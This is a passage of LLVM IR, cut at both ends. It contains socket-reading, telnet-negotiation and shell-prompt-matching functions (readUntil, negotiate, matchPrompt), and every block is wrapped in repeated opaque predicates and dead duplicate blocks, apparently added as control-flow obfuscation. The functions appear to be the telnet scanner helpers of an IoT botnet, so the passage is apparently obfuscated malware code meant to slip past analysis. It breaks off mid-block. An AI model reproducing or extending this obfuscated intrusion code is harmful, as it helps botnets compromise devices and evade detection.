  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.72, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %originalBBpart222, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %164

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %122, %17
  %19 = load i32, i32* @x.47
  %20 = load i32, i32* @y.48
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %7, align 4
  %29 = icmp sgt i32 %27, %28
  %30 = load i32, i32* @x.47
  %31 = load i32, i32* @y.48
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %104

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i8*, i8** %3, align 8
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = sub i64 0, %44
  %46 = getelementptr inbounds i8, i8* %42, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %102, label %50

; <label>:50:                                     ; preds = %38
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 32
  br i1 %61, label %102, label %62

; <label>:62:                                     ; preds = %50
  %63 = load i8*, i8** %3, align 8
  %64 = load i32, i32* %5, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i32, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 0, %68
  %70 = getelementptr inbounds i8, i8* %66, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp eq i32 %72, 13
  br i1 %73, label %102, label %74

; <label>:74:                                     ; preds = %62
  %75 = load i32, i32* @x.47
  %76 = load i32, i32* @y.48
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %74
  %83 = load i8*, i8** %3, align 8
  %84 = load i32, i32* %5, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %83, i64 %85
  %87 = load i32, i32* %7, align 4
  %88 = sext i32 %87 to i64
  %89 = sub i64 0, %88
  %90 = getelementptr inbounds i8, i8* %86, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = sext i8 %91 to i32
  %93 = icmp eq i32 %92, 10
  %94 = load i32, i32* @x.47
  %95 = load i32, i32* @y.48
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %102

; <label>:102:                                    ; preds = %originalBBpart24, %62, %50, %38
  %103 = phi i1 [ true, %62 ], [ true, %50 ], [ true, %38 ], [ %93, %originalBBpart24 ]
  br label %104

; <label>:104:                                    ; preds = %102, %originalBBpart2
  %105 = phi i1 [ false, %originalBBpart2 ], [ %103, %102 ]
  %106 = load i32, i32* @x.47
  %107 = load i32, i32* @y.48
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %104
  %114 = load i32, i32* @x.47
  %115 = load i32, i32* @y.48
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %105, label %122, label %125

; <label>:122:                                    ; preds = %originalBBpart28
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %7, align 4
  br label %18

; <label>:125:                                    ; preds = %originalBBpart28
  %126 = load i8*, i8** %3, align 8
  %127 = load i32, i32* %5, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  %130 = load i32, i32* %7, align 4
  %131 = sext i32 %130 to i64
  %132 = sub i64 0, %131
  %133 = getelementptr inbounds i8, i8* %129, i64 %132
  %134 = load i8, i8* %133, align 1
  %135 = sext i8 %134 to i32
  %136 = load i8*, i8** %4, align 8
  %137 = load i32, i32* %6, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8, i8* %136, i64 %138
  %140 = load i8, i8* %139, align 1
  %141 = sext i8 %140 to i32
  %142 = icmp eq i32 %135, %141
  br i1 %142, label %143, label %144

; <label>:143:                                    ; preds = %125
  store i32 1, i32* %2, align 4
  br label %165

; <label>:144:                                    ; preds = %125
  br label %145

; <label>:145:                                    ; preds = %144
  %146 = load i32, i32* @x.47
  %147 = load i32, i32* @y.48
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %145
  %154 = load i32, i32* %6, align 4
  %155 = add nsw i32 %154, 1
  store i32 %155, i32* %6, align 4
  %156 = load i32, i32* @x.47
  %157 = load i32, i32* @y.48
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart222, label %originalBB10alteredBB

originalBBpart222:                                ; preds = %originalBB10
  br label %11

; <label>:164:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %165

; <label>:165:                                    ; preds = %164, %143
  %166 = load i32, i32* %2, align 4
  ret i32 %166

originalBBalteredBB:                              ; preds = %originalBB, %18
  %167 = load i32, i32* %5, align 4
  %168 = load i32, i32* %7, align 4
  %169 = icmp sgt i32 %167, %168
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %74
  %170 = load i8*, i8** %3, align 8
  %171 = load i32, i32* %5, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds i8, i8* %170, i64 %172
  %174 = load i32, i32* %7, align 4
  %175 = sext i32 %174 to i64
  %_ = sub i64 0, %175
  %gen = mul i64 %_, %175
  %176 = sub i64 0, %175
  %177 = getelementptr inbounds i8, i8* %173, i64 %176
  %178 = load i8, i8* %177, align 1
  %179 = sext i8 %178 to i32
  %180 = icmp eq i32 %179, 10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %104
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %145
  %181 = load i32, i32* %6, align 4
  %_11 = sub i32 0, %181
  %gen12 = add i32 %_11, 1
  %_13 = shl i32 %181, 1
  %_14 = sub i32 0, %181
  %gen15 = add i32 %_14, 1
  %_16 = sub i32 %181, 1
  %gen17 = mul i32 %_16, 1
  %_18 = sub i32 0, %181
  %gen19 = add i32 %_18, 1
  %_20 = shl i32 %181, 1
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %6, align 4
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %328, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %80

; <label>:38:                                     ; preds = %33
  %39 = load i32, i32* @x.49
  %40 = load i32, i32* @y.50
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %38
  %47 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %48 = load i64, i64* %47, align 8
  %49 = icmp sgt i64 %48, 0
  %50 = load i32, i32* @x.49
  %51 = load i32, i32* @y.50
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %62, label %58

; <label>:58:                                     ; preds = %originalBBpart2
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %60 = load i64, i64* %59, align 8
  %61 = icmp sgt i64 %60, 0
  br label %62

; <label>:62:                                     ; preds = %58, %originalBBpart2
  %63 = phi i1 [ true, %originalBBpart2 ], [ %61, %58 ]
  %64 = load i32, i32* @x.49
  %65 = load i32, i32* @y.50
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %62
  %72 = load i32, i32* @x.49
  %73 = load i32, i32* @y.50
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %80

; <label>:80:                                     ; preds = %originalBBpart24, %33
  %81 = phi i1 [ false, %33 ], [ %63, %originalBBpart24 ]
  %82 = load i32, i32* @x.49
  %83 = load i32, i32* @y.50
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %80
  %90 = load i32, i32* @x.49
  %91 = load i32, i32* @y.50
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %81, label %98, label %329

; <label>:98:                                     ; preds = %originalBBpart28
  br label %99

; <label>:99:                                     ; preds = %98
  %100 = load i32, i32* @x.49
  %101 = load i32, i32* @y.50
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %99
  %108 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %109 = getelementptr inbounds [16 x i64], [16 x i64]* %108, i64 0, i64 0
  %110 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %109) #2, !srcloc !4
  %111 = extractvalue { i64, i64* } %110, 0
  %112 = extractvalue { i64, i64* } %110, 1
  %113 = trunc i64 %111 to i32
  store i32 %113, i32* %24, align 4
  %114 = ptrtoint i64* %112 to i64
  %115 = trunc i64 %114 to i32
  store i32 %115, i32* %25, align 4
  %116 = load i32, i32* @x.49
  %117 = load i32, i32* @y.50
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %124

; <label>:124:                                    ; preds = %originalBBpart212
  %125 = load i32, i32* @x.49
  %126 = load i32, i32* @y.50
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %124
  %133 = load i32, i32* %10, align 4
  %134 = srem i32 %133, 64
  %135 = zext i32 %134 to i64
  %136 = shl i64 1, %135
  %137 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %138 = load i32, i32* %10, align 4
  %139 = sdiv i32 %138, 64
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds [16 x i64], [16 x i64]* %137, i64 0, i64 %140
  %142 = load i64, i64* %141, align 8
  %143 = or i64 %142, %136
  store i64 %143, i64* %141, align 8
  %144 = load i32, i32* %10, align 4
  %145 = add nsw i32 %144, 1
  %146 = call i32 @select(i32 %145, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %147 = icmp slt i32 %146, 1
  %148 = load i32, i32* @x.49
  %149 = load i32, i32* @y.50
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart256, label %originalBB14alteredBB

originalBBpart256:                                ; preds = %originalBB14
  br i1 %147, label %156, label %157

; <label>:156:                                    ; preds = %originalBBpart256
  br label %329

; <label>:157:                                    ; preds = %originalBBpart256
  %158 = load i32, i32* @x.49
  %159 = load i32, i32* @y.50
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %157
  %166 = load i8*, i8** %15, align 8
  %167 = load i32, i32* %18, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8, i8* %166, i64 %168
  store i8* %169, i8** %23, align 8
  %170 = load i32, i32* %10, align 4
  %171 = load i8*, i8** %23, align 8
  %172 = call i64 @recv(i32 %170, i8* %171, i64 1, i32 0)
  %173 = trunc i64 %172 to i32
  store i32 %173, i32* %19, align 4
  %174 = load i32, i32* %19, align 4
  %175 = icmp eq i32 %174, -1
  %176 = load i32, i32* @x.49
  %177 = load i32, i32* @y.50
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %175, label %187, label %184

; <label>:184:                                    ; preds = %originalBBpart260
  %185 = load i32, i32* %19, align 4
  %186 = icmp eq i32 %185, 0
  br i1 %186, label %187, label %188

; <label>:187:                                    ; preds = %184, %originalBBpart260
  store i32 0, i32* %9, align 4
  br label %334

; <label>:188:                                    ; preds = %184
  %189 = load i32, i32* %19, align 4
  %190 = load i32, i32* %18, align 4
  %191 = add nsw i32 %190, %189
  store i32 %191, i32* %18, align 4
  %192 = load i8*, i8** %23, align 8
  %193 = load i8, i8* %192, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 255
  br i1 %195, label %196, label %266

; <label>:196:                                    ; preds = %188
  %197 = load i32, i32* %10, align 4
  %198 = load i8*, i8** %23, align 8
  %199 = getelementptr inbounds i8, i8* %198, i64 1
  %200 = call i64 @recv(i32 %197, i8* %199, i64 2, i32 0)
  %201 = trunc i64 %200 to i32
  store i32 %201, i32* %19, align 4
  %202 = load i32, i32* %19, align 4
  %203 = icmp eq i32 %202, -1
  br i1 %203, label %223, label %204

; <label>:204:                                    ; preds = %196
  %205 = load i32, i32* @x.49
  %206 = load i32, i32* @y.50
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %204
  %213 = load i32, i32* %19, align 4
  %214 = icmp eq i32 %213, 0
  %215 = load i32, i32* @x.49
  %216 = load i32, i32* @y.50
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %214, label %223, label %240

; <label>:223:                                    ; preds = %originalBBpart264, %196
  %224 = load i32, i32* @x.49
  %225 = load i32, i32* @y.50
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %223
  store i32 0, i32* %9, align 4
  %232 = load i32, i32* @x.49
  %233 = load i32, i32* @y.50
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %334

; <label>:240:                                    ; preds = %originalBBpart264
  %241 = load i32, i32* %19, align 4
  %242 = load i32, i32* %18, align 4
  %243 = add nsw i32 %242, %241
  store i32 %243, i32* %18, align 4
  %244 = load i32, i32* %10, align 4
  %245 = load i8*, i8** %23, align 8
  %246 = call i32 @negotiate(i32 %244, i8* %245, i32 3)
  %247 = icmp ne i32 %246, 0
  br i1 %247, label %265, label %248

; <label>:248:                                    ; preds = %240
  %249 = load i32, i32* @x.49
  %250 = load i32, i32* @y.50
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %248
  store i32 0, i32* %9, align 4
  %257 = load i32, i32* @x.49
  %258 = load i32, i32* @y.50
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %334

; <label>:265:                                    ; preds = %240
  br label %328

; <label>:266:                                    ; preds = %188
  %267 = load i8*, i8** %15, align 8
  %268 = load i8*, i8** %11, align 8
  %269 = call i8* @strstr(i8* %267, i8* %268) #10
  %270 = icmp ne i8* %269, null
  br i1 %270, label %310, label %271

; <label>:271:                                    ; preds = %266
  %272 = load i32, i32* @x.49
  %273 = load i32, i32* @y.50
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %271
  %280 = load i32, i32* %12, align 4
  %281 = icmp ne i32 %280, 0
  %282 = load i32, i32* @x.49
  %283 = load i32, i32* @y.50
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %281, label %290, label %327

; <label>:290:                                    ; preds = %originalBBpart276
  %291 = load i32, i32* @x.49
  %292 = load i32, i32* @y.50
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %290
  %299 = load i8*, i8** %15, align 8
  %300 = call i32 @matchPrompt(i8* %299)
  %301 = icmp ne i32 %300, 0
  %302 = load i32, i32* @x.49
  %303 = load i32, i32* @y.50
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %301, label %310, label %327

; <label>:310:                                    ; preds = %originalBBpart280, %266
  %311 = load i32, i32* @x.49
  %312 = load i32, i32* @y.50
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %310
  store i32 1, i32* %20, align 4
  %319 = load i32, i32* @x.49
  %320 = load i32, i32* @y.50
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %329

; <label>:327:                                    ; preds = %originalBBpart280, %originalBBpart276
  br label %328

; <label>:328:                                    ; preds = %327, %265
  br label %33

; <label>:329:                                    ; preds = %originalBBpart284, %156, %originalBBpart28
  %330 = load i32, i32* %20, align 4
  %331 = icmp ne i32 %330, 0
  br i1 %331, label %332, label %333

; <label>:332:                                    ; preds = %329
  store i32 1, i32* %9, align 4
  br label %334

; <label>:333:                                    ; preds = %329
  store i32 0, i32* %9, align 4
  br label %334

; <label>:334:                                    ; preds = %333, %332, %originalBBpart272, %originalBBpart268, %187
  %335 = load i32, i32* @x.49
  %336 = load i32, i32* @y.50
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %334
  %343 = load i32, i32* %9, align 4
  %344 = load i32, i32* @x.49
  %345 = load i32, i32* @y.50
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  ret i32 %343

originalBBalteredBB:                              ; preds = %originalBB, %38
  %352 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %353 = load i64, i64* %352, align 8
  %354 = icmp sgt i64 %353, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %62
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %80
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %99
  %355 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %356 = getelementptr inbounds [16 x i64], [16 x i64]* %355, i64 0, i64 0
  %357 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %356) #2, !srcloc !4
  %358 = extractvalue { i64, i64* } %357, 0
  %359 = extractvalue { i64, i64* } %357, 1
  %360 = trunc i64 %358 to i32
  store i32 %360, i32* %24, align 4
  %361 = ptrtoint i64* %359 to i64
  %362 = trunc i64 %361 to i32
  store i32 %362, i32* %25, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %124
  %363 = load i32, i32* %10, align 4
  %_ = sub i32 %363, 64
  %gen = mul i32 %_, 64
  %364 = srem i32 %363, 64
  %365 = zext i32 %364 to i64
  %_15 = sub i64 0, 1
  %gen16 = add i64 %_15, %365
  %_17 = sub i64 0, 1
  %gen18 = add i64 %_17, %365
  %_19 = sub i64 0, 1
  %gen20 = add i64 %_19, %365
  %_21 = sub i64 0, 1
  %gen22 = add i64 %_21, %365
  %_23 = shl i64 1, %365
  %366 = shl i64 1, %365
  %367 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %368 = load i32, i32* %10, align 4
  %_24 = shl i32 %368, 64
  %_25 = shl i32 %368, 64
  %_26 = shl i32 %368, 64
  %_27 = sub i32 0, %368
  %gen28 = add i32 %_27, 64
  %_29 = sub i32 %368, 64
  %gen30 = mul i32 %_29, 64
  %_31 = shl i32 %368, 64
  %_32 = sub i32 %368, 64
  %gen33 = mul i32 %_32, 64
  %369 = sdiv i32 %368, 64
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds [16 x i64], [16 x i64]* %367, i64 0, i64 %370
  %372 = load i64, i64* %371, align 8
  %_34 = sub i64 %372, %366
  %gen35 = mul i64 %_34, %366
  %_36 = sub i64 %372, %366
  %gen37 = mul i64 %_36, %366
  %_38 = sub i64 %372, %366
  %gen39 = mul i64 %_38, %366
  %_40 = sub i64 %372, %366
  %gen41 = mul i64 %_40, %366
  %_42 = sub i64 %372, %366
  %gen43 = mul i64 %_42, %366
  %_44 = shl i64 %372, %366
  %_45 = sub i64 0, %372
  %gen46 = add i64 %_45, %366
  %_47 = sub i64 0, %372
  %gen48 = add i64 %_47, %366
  %373 = or i64 %372, %366
  store i64 %373, i64* %371, align 8
  %374 = load i32, i32* %10, align 4
  %_49 = sub i32 0, %374
  %gen50 = add i32 %_49, 1
  %_51 = sub i32 %374, 1
